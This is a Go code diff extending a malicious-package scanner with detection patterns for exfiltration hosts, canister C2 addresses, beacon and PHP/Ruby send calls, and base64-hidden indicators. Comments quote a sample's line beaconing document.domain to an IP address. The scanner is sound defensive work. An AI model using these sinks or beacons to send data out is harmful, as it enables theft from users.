@@ -21,9 +21,13 @@
 package iocscan
 
 import (
+	"encoding/base64"
 	"net/netip"
+	"path"
 	"regexp"
 	"strings"
+	"unicode"
+	"unicode/utf8"
 )
 
 type Result struct {
@@ -76,7 +80,15 @@ var (
 	// the context a real one appears in. Go's regexp is RE2 and has no
 	// lookbehind, so the boundary is enforced in code rather than in the pattern
 	// — see findExfilHost.
-	exfilHostRE = regexp.MustCompile(`(?i)discord(?:app)?\.com/api/webhooks/|ptb\.discord\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|webhook\.site/|requestbin\.(?:net|com)|pipedream\.net|\.ngrok(?:-free)?\.(?:io|app)|pastebin\.com/raw/|paste\.ee/|hastebin\.com|ghostbin\.|transfer\.sh|anonfiles\.com|gofile\.io|file\.io/|0x0\.st|oshi\.at|burpcollaborator\.net|\.interactsh\.com|oast\.(?:fun|site|pro|live|online)|dpaste\.`)
+	exfilHostRE = regexp.MustCompile(`(?i)discord(?:app)?\.com/api/webhooks/|ptb\.discord\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|webhook\.site/|requestbin\.(?:net|com)|pipedream\.net|\.ngrok(?:-free)?\.(?:io|app)|pastebin\.com/raw/|paste\.ee/|hastebin\.com|ghostbin\.|transfer\.sh|anonfiles\.com|gofile\.io|file\.io/|0x0\.st|oshi\.at|burpcollaborator\.net|\.interactsh\.com|oast\.(?:fun|site|pro|live|online)|dpaste\.` +
+		// An Internet Computer canister served RAW (uncertified) answers any
+		// HTTP request with whatever the canister owner deploys — a C2 and drop
+		// with no domain to seize: CanisterWorm (2026-03) polled
+		// tdtqy-...-cai.raw.icp0.io, pgserve (2026-04) POSTed to
+		// cjn37-...-cai.raw.icp0.io/drop. Only the canister-id form is
+		// matched, so ICP SDK prose ("<canister>.raw.icp0.io") and the
+		// certified boundary hosts (ic0.app, icp0.io, icp-api.io) are not.
+		`|[a-z0-9]{5}(?:-[a-z0-9]{5}){3}-[a-z0-9]{3}\.raw\.(?:icp0\.io|ic0\.app)`)
 
 	// credStoreRE / tokenGrabRE / walletRE / keyloggerRE: stealer building
 	// blocks. High-signal but legitimately present in browser/forensics tools,
@@ -117,6 +129,22 @@ var (
 	// enforces, is unchanged.
 	nodeSendRE = regexp.MustCompile(`\bhttps?\.(?:request|get)\s*\(|\bdns\.(?:lookup|resolve\w*)\s*\(|\bnet\.(?:connect|createConnection)\s*\(`)
 
+	// beaconSendRE is the browser send that is not a call: assigning a URL to
+	// an Image (or script/iframe) .src makes the request. helpersutils-dev-tools
+	// (2026-09, MAL-2026-16465) beaconed document.domain with
+	// `new Image().src='http://5.189.173.113:8899/csp-edu?d='+...`. Like
+	// nodeSendRE it only couples the exfil_host tier and the IP rule; a bare
+	// `.src =` never fires anything on its own.
+	beaconSendRE = regexp.MustCompile(`\bnew\s+Image\b|\.src\s*=[^=]`)
+
+	// scriptSendRE is PHP's and Ruby's own send primitives, for the files
+	// WantsScriptSource admits: laravel-lang (2026-05) posted from an
+	// autoloaded helpers.php with curl_exec; a Ruby payload uses Net::HTTP,
+	// open-uri, a raw socket or a client gem. file_get_contents and fopen
+	// count only on a literal http(s) URL — on a path they read a file.
+	// Read only for .php/.rb files (fileSends).
+	scriptSendRE = regexp.MustCompile(`\bcurl_exec\s*\(|\b(?:file_get_contents|fopen)\s*\(\s*['"]https?://|\bfsockopen\s*\(|\bstream_socket_client\s*\(|\bwp_remote_(?:post|get|request)\s*\(|\bNet::HTTP\b|\bURI\.open\b|\bTCPSocket\.(?:new|open)\b|\b(?:Faraday|HTTParty|RestClient)\.`)
+
 	// nonShippingPathRE marks files that ship inside a package but are not part
 	// of what the package DOES: its own test suite, its documentation examples,
 	// and third-party code it vendors.
@@ -148,6 +176,10 @@ var (
 // documentation, or vendored third-party content rather than the package's own
 // shipping code. See nonShippingPathRE for why this distinction exists.
 func isNonShippingPath(name string) bool { return nonShippingPathRE.MatchString(name) }
+
+// IsNonShippingPath is isNonShippingPath for the other byte detectors
+// (core/scriptsource), so they downgrade the same paths iocscan does.
+func IsNonShippingPath(name string) bool { return isNonShippingPath(name) }
 
 // hostBoundaryOK reports whether an exfilHostRE match starting at `start`
 // begins where a hostname can actually begin, rather than in the middle of a
@@ -237,6 +269,98 @@ func findPublicIPURL(body string) string {
 	return ""
 }
 
+// exfilSend reports whether body makes an outbound request of any shape the
+// exfil_host tier and the public-IP rule accept as coupling.
+func exfilSend(body string) bool {
+	return netSendRE.MatchString(body) || nodeSendRE.MatchString(body) || beaconSendRE.MatchString(body)
+}
+
+// fileSends is exfilSend for JS/Python, scriptSendRE for PHP and Ruby.
+func fileSends(name, text string) bool {
+	switch strings.ToLower(path.Ext(name)) {
+	case ".php", ".rb":
+		return scriptSendRE.MatchString(text)
+	}
+	return exfilSend(text)
+}
+
+// WantsScriptSource selects the PHP, Ruby and Python .pth files Scan reads
+// on top of the caller's source set. A Composer autoload.files entry, a
+// gem's lib/ and a .pth line all run without the user calling anything.
+// Only the IOC scanner reads them; other detectors keep their file set.
+func WantsScriptSource(name string) bool {
+	switch strings.ToLower(path.Ext(name)) {
+	case ".php", ".rb", ".pth":
+		return true
+	}
+	return false
+}
+
+// base64LiteralRE is a quoted string literal of base64 alphabet long enough
+// to carry a URL. A data: URI ("data:image/png;base64,...") does not start at
+// the quote, so inlined images, fonts and sourcemaps are not matched.
+var base64LiteralRE = regexp.MustCompile(`['"\x60]([A-Za-z0-9+/]{40,}={0,2})['"\x60]`)
+
+// Per-file bounds on base64 decoding: literals examined, the size of one
+// literal, and the decoded text kept.
+const (
+	maxBase64Literals = 256
+	maxBase64Literal  = 64 << 10
+	maxBase64Decoded  = 256 << 10
+)
+
+// decodedBase64Text returns the file's base64 string literals that decode to
+// printable text, newline-joined, or "". Binary (images, fonts, wasm, hashes)
+// is dropped, so only decoded source or URLs reach the host rules.
+// ponytail: one level, quoted literals only; a split or nested encoding is
+// missed. Add concatenation/nesting when a sample needs it.
+func decodedBase64Text(body string) string {
+	var sb strings.Builder
+	for _, m := range base64LiteralRE.FindAllStringSubmatch(body, maxBase64Literals) {
+		lit := m[1]
+		if len(lit) > maxBase64Literal {
+			continue
+		}
+		raw, err := base64.StdEncoding.DecodeString(lit)
+		if err != nil {
+			if raw, err = base64.RawStdEncoding.DecodeString(strings.TrimRight(lit, "=")); err != nil {
+				continue
+			}
+		}
+		if !printableText(raw) {
+			continue
+		}
+		if sb.Len()+len(raw) > maxBase64Decoded {
+			break
+		}
+		sb.Write(raw)
+		sb.WriteByte('\n')
+	}
+	return sb.String()
+}
+
+// printableText reports whether b is UTF-8 text with no control characters
+// other than tab, newline and carriage return.
+func printableText(b []byte) bool {
+	if !utf8.Valid(b) {
+		return false
+	}
+	for _, r := range string(b) {
+		if unicode.IsControl(r) && r != '\t' && r != '\n' && r != '\r' {
+			return false
+		}
+	}
+	return true
+}
+
+// viaBase64 marks a Detail whose indicator appears only in decoded base64.
+func viaBase64(body, indicator string) string {
+	if strings.Contains(body, indicator) {
+		return ""
+	}
+	return " (in base64)"
+}
+
 // Scan reports the strongest IOC across a package's source files.
 func Scan(files map[string][]byte) Result {
 	// Stealer evidence is tracked in two buckets, shipping and non-shipping,
@@ -265,33 +389,55 @@ func Scan(files map[string][]byte) Result {
 		if len(body) > maxFileSize {
 			body = body[:maxFileSize]
 		}
+		// The host and IP rules also read the file's base64 string literals,
+		// decoded: CanisterWorm (2026-03) kept its canister C2 inside a
+		// base64 Python payload. A send in the file OR in the decoded text
+		// couples. The stealer tier and the reputation feed read body only.
+		hostText := body
+		if dec := decodedBase64Text(body); dec != "" {
+			hostText = body + "\n" + dec
+		}
 		// Tier 1: an exfil sink host is dispositive when it appears in code the
 		// package actually ships and runs. In its own tests, docs examples, or
 		// vendored third-party trees it is downgraded to a warning — see
 		// nonShippingPathRE.
-		if m := findExfilHost(body); m != "" {
-			hit := Result{Detected: true, Kind: "exfil_host", Detail: name + ": " + strings.TrimSpace(m)}
+		//
+		// PHP, Ruby and .pth files (WantsScriptSource) count only a COUPLED
+		// exfil_host or IP hit, with their own send primitives: Ruby's
+		// ubiquitous obj.send(:m) is not a request, and named-only hits there
+		// were the false blocks measured — domain_name's public-suffix data
+		// names .ngrok.io, metasm's Windows export table matches the stealer
+		// strings. The stealer tier and the feed's coupling read JS/Python.
+		script := WantsScriptSource(name)
+		if m := findExfilHost(hostText); m != "" {
+			hit := Result{Detected: true, Kind: "exfil_host", Detail: name + ": " + strings.TrimSpace(m) + viaBase64(body, m)}
 			if !isNonShippingPath(name) {
-				hit.Coupled = netSendRE.MatchString(body) || nodeSendRE.MatchString(body)
+				hit.Coupled = fileSends(name, hostText)
 				if hit.Coupled {
 					return hit
+				}
+				if script {
+					continue
 				}
 				if exfil == nil {
 					exfil = &hit
 				}
 				continue
 			}
-			if weakExfil == nil {
+			if weakExfil == nil && !script {
 				hit.Weak = true
 				hit.Detail += " (test/docs/vendored path — not shipping code)"
 				weakExfil = &hit
 			}
-		} else if !isNonShippingPath(name) && (netSendRE.MatchString(body) || nodeSendRE.MatchString(body)) {
+		} else if !isNonShippingPath(name) && fileSends(name, hostText) {
 			// A public IP literal counts only coupled: addresses are named in
 			// configs and comments far more often than hostnames on the list.
-			if ip := findPublicIPURL(body); ip != "" {
-				return Result{Detected: true, Kind: "exfil_host", Detail: name + ": " + ip, Coupled: true}
+			if ip := findPublicIPURL(hostText); ip != "" {
+				return Result{Detected: true, Kind: "exfil_host", Detail: name + ": " + ip + viaBase64(body, ip), Coupled: true}
 			}
+		}
+		if script {
+			continue
 		}
 		if netSendRE.MatchString(body) {
 			sinkOrSend = true
